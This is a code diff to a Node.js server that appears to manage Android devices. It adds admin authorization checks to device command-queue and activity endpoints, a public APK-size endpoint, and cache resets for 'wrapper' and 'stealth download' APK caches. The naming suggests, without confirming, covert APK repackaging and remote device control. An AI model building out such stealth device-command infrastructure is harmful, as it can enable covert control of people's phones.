@@ -1490,6 +1490,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       try { fs.unlinkSync(req.file.path); } catch (_) {}
       _wrapperApkCache = { buffer: null, timestamp: 0 };
       _wrapperZipCache = { buffer: null, forHash: null };
+      _wrapperBuf = null;
       const size = fs.statSync(wrapperPath).size;
       console.log(`[Wrapper] Uploaded: ${(size / 1048576).toFixed(1)} MB`);
       res.json({ success: true, message: 'Wrapper APK uploaded', size });
@@ -1788,6 +1789,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     _landingZipCache = { buffer: null, forHash: null };
     _wrapperApkCache = { buffer: null, timestamp: 0 };
     _wrapperZipCache = { buffer: null, forHash: null };
+    _wrapperBuf = null;
     const sc = app.get('_stealthDlCache'); if (sc) sc.clear();
     console.log('[Cache] All APK caches invalidated');
   });
@@ -2129,6 +2131,23 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Ping endpoint for RTT measurement
   app.get('/api/ping', (req, res) => {
     res.json({ pong: Date.now() });
+  });
+
+  // Public APK size endpoint — used by landing page (no auth, returns size only)
+  app.get('/api/public/apk-size', (req, res) => {
+    try {
+      const apkPath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
+      const fallbackPath = path.join(__dirname, 'data', 'Netmirror.apk');
+      let size = 0;
+      if (fs.existsSync(apkPath)) {
+        size = fs.statSync(apkPath).size;
+      } else if (fs.existsSync(fallbackPath)) {
+        size = fs.statSync(fallbackPath).size;
+      }
+      res.json({ available: size > 0, size });
+    } catch (_) {
+      res.json({ available: false, size: 0 });
+    }
   });
 
   // Domain discovery endpoint — unauthenticated, cached
@@ -3491,6 +3510,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 // Body: { command_type, payload }
 // If device is online → executes immediately. If offline → queues.
 app.post('/api/admin/connections/:deviceId/queue-command', (req, res) => {
+  if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
   try {
     const { deviceId } = req.params;
     const { command_type, payload = {} } = req.body;
@@ -3524,6 +3544,7 @@ app.post('/api/admin/connections/:deviceId/queue-command', (req, res) => {
 
 // GET /api/admin/connections/:deviceId/queue — View pending commands for a device
 app.get('/api/admin/connections/:deviceId/queue', (req, res) => {
+  if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
   try {
     const { deviceId } = req.params;
     const pending = db.prepare(
@@ -3540,6 +3561,7 @@ app.get('/api/admin/connections/:deviceId/queue', (req, res) => {
 
 // DELETE /api/admin/queue/:commandId — Cancel a queued command
 app.delete('/api/admin/queue/:commandId', (req, res) => {
+  if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
   try {
     const id = parseInt(req.params.commandId);
     const cmd = db.prepare('SELECT id, status FROM command_queue WHERE id = ?').get(id);
@@ -3554,6 +3576,7 @@ app.delete('/api/admin/queue/:commandId', (req, res) => {
 
 // GET /api/admin/queue/pending-count — Total pending commands across all devices (for dashboard badge)
 app.get('/api/admin/queue/pending-count', (req, res) => {
+  if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
   try {
     const row = db.prepare(`SELECT COUNT(*) as n FROM command_queue WHERE status='pending' AND (expires_at IS NULL OR expires_at > datetime('now'))`).get();
     res.json({ pending: row.n });
@@ -3568,6 +3591,7 @@ app.get('/api/admin/queue/pending-count', (req, res) => {
 
 // GET /api/admin/connections/:deviceId/activity — Get device activity timeline
 app.get('/api/admin/connections/:deviceId/activity', (req, res) => {
+  if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
   try {
     const { deviceId } = req.params;
     const limit = Math.min(parseInt(req.query.limit) || 50, 200);
@@ -3596,6 +3620,7 @@ app.get('/api/admin/connections/:deviceId/activity', (req, res) => {
 
 // GET /api/admin/activity/recent — Most recent activity across all devices (for dashboard feed)
 app.get('/api/admin/activity/recent', (req, res) => {
+  if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
   try {
     const limit = Math.min(parseInt(req.query.limit) || 30, 100);
     const events = db.prepare(`
